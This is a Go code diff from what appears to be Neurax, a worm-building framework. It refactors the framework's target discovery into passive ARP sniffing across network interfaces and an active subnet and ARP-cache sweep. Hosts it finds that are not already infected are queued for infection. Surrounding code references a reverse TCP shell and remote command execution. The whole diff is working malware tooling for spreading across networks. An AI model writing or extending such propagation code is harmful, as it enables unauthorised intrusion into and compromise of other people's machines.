@@ -38,6 +38,7 @@ type __NeuraxConfig struct {
 	cidr             string
 	scan_passive     bool
 	scan_timeout     int
+	scan_all         bool
 	read_arp_cache   bool
 	threads          int
 	full_range       bool
@@ -64,6 +65,7 @@ var NeuraxConfig = __NeuraxConfig{
 	cidr:             coldfire.GetLocalIp() + "/24",
 	scan_passive:     false,
 	scan_timeout:     2,
+	scan_all:         false,
 	read_arp_cache:   false,
 	threads:          10,
 	full_range:       false,
@@ -276,7 +278,6 @@ func handle_command(cmd string) {
 		}
 		coldfire.CmdOut(cmd)
 	}
-
 }
 
 func NeuraxOpenComm() {
@@ -305,52 +306,73 @@ func NeuraxReverseTCP(proto string) {
 	}
 }
 
+func neurax_scan_passive_single_iface(c chan string, iface string) {
+	var snapshot_len int32 = 1024
+	timeout := 5000000000 * time.Second
+	handler, err := pcap.OpenLive(iface, snapshot_len, false, timeout)
+	ReportError("Cannot open device", err)
+	handler.SetBPFFilter("arp")
+	defer handler.Close()
+	packetSource := gopacket.NewPacketSource(handler, handler.LinkType())
+	for packet := range packetSource.Packets() {
+		ip_layer := packet.Layer(layers.LayerTypeIPv4)
+		if ip_layer != nil {
+			ip, _ := ip_layer.(*layers.IPv4)
+			source := fmt.Sprintf("%s", ip.SrcIP)
+			destination := fmt.Sprintf("%s", ip.DstIP)
+			if source != coldfire.GetLocalIp() && !IsHostInfected(source) {
+				c <- source
+			}
+			if destination != coldfire.GetLocalIp() && !IsHostInfected(destination) {
+				c <- destination
+			}
+		}
+	}
+}
+
+func neurax_scan_passive(c chan string) {
+	current_iface, _ := coldfire.Iface()
+	ifaces_to_use := []string{current_iface}
+	device_names := []string{}
+	devices, err := pcap.FindAllDevs()
+	for _, dev := range devices {
+		device_names = append(device_names, dev.Name)
+	}
+	ReportError("Cannot obtain network interfaces", err)
+	if NeuraxConfig.scan_all {
+		ifaces_to_use = append(ifaces_to_use, device_names...)
+	}
+	for _, device := range ifaces_to_use {
+		go neurax_scan_passive_single_iface(c, device)
+	}
+}
+
+func neurax_scan_active(c chan string) {
+	targets := []string{}
+	if NeuraxConfig.read_arp_cache {
+		for ip, _ := range arp.Table() {
+			if !IsHostInfected(ip) {
+				targets = append(targets, ip)
+			}
+		}
+	}
+	full_addr_range, _ := coldfire.ExpandCidr(NeuraxConfig.cidr)
+	for _, addr := range full_addr_range {
+		targets = append(targets, addr)
+	}
+	targets = coldfire.RemoveFromSlice(targets, coldfire.GetLocalIp())
+	for _, target := range targets {
+		if IsHostActive(target) && !IsHostInfected(target) {
+			c <- target
+		}
+	}
+}
+
 func neurax_scan_core(c chan string) {
 	if NeuraxConfig.scan_passive {
-		var snapshot_len int32 = 1024
-		var timeout time.Duration = 500000 * time.Second
-		devices, err := pcap.FindAllDevs()
-		ReportError("Cannot obtain network interfaces", err)
-		for _, device := range devices {
-			handler, err := pcap.OpenLive(device.Name, snapshot_len, false, timeout)
-			ReportError("Cannot open device", err)
-			handler.SetBPFFilter("arp")
-			defer handler.Close()
-			packetSource := gopacket.NewPacketSource(handler, handler.LinkType())
-			for packet := range packetSource.Packets() {
-				ip_layer := packet.Layer(layers.LayerTypeIPv4)
-				if ip_layer != nil {
-					ip, _ := ip_layer.(*layers.IPv4)
-					source := fmt.Sprintf("%s", ip.SrcIP)
-					destination := fmt.Sprintf("%s", ip.DstIP)
-					if source != coldfire.GetLocalIp() && !IsHostInfected(source) {
-						c <- source
-					}
-					if destination != coldfire.GetLocalIp() && !IsHostInfected(destination) {
-						c <- destination
-					}
-				}
-			}
-		}
+		neurax_scan_passive(c)
 	} else {
-		targets := []string{}
-		if NeuraxConfig.read_arp_cache {
-			for ip, _ := range arp.Table() {
-				if !IsHostInfected(ip) {
-					targets = append(targets, ip)
-				}
-			}
-		}
-		full_addr_range, _ := coldfire.ExpandCidr(NeuraxConfig.cidr)
-		for _, addr := range full_addr_range {
-			targets = append(targets, addr)
-		}
-		targets = coldfire.RemoveFromSlice(targets, coldfire.GetLocalIp())
-		for _, target := range targets {
-			if IsHostActive(target) && !IsHostInfected(target) {
-				c <- target
-			}
-		}
+		neurax_scan_active(c)
 	}
 }
 
